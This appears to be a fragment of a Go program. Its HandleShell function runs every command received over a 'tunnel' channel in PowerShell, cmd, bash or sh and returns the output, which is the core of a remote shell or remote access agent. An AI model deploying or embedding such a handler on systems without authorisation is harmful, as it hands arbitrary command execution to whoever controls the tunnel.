package main

import (
	"os/exec"
	"runtime"
	"os"
)

func FileExists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return true
}

func HandleShell(tunnel Tunnel) {
	var cmd *exec.Cmd
	for {
		rawCmd :=  <-tunnel.Input
		if runtime.GOOS == "windows" {
			if FileExists("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe") {
				cmd = exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", string(rawCmd))
			} else {
				cmd = exec.Command("cmd", "/C", string(rawCmd))
			}
		} else {
			if FileExists("/bin/bash") {
				cmd = exec.Command("/bin/bash", "-c", string(rawCmd))
			} else {
				cmd = exec.Command("/bin/sh", "-c", string(rawCmd))
			}
		}
		out, err := cmd.CombinedOutput()
		if err != nil {
			out = []byte(err.Error())
		}
		tunnel.Output <- out
	}
}
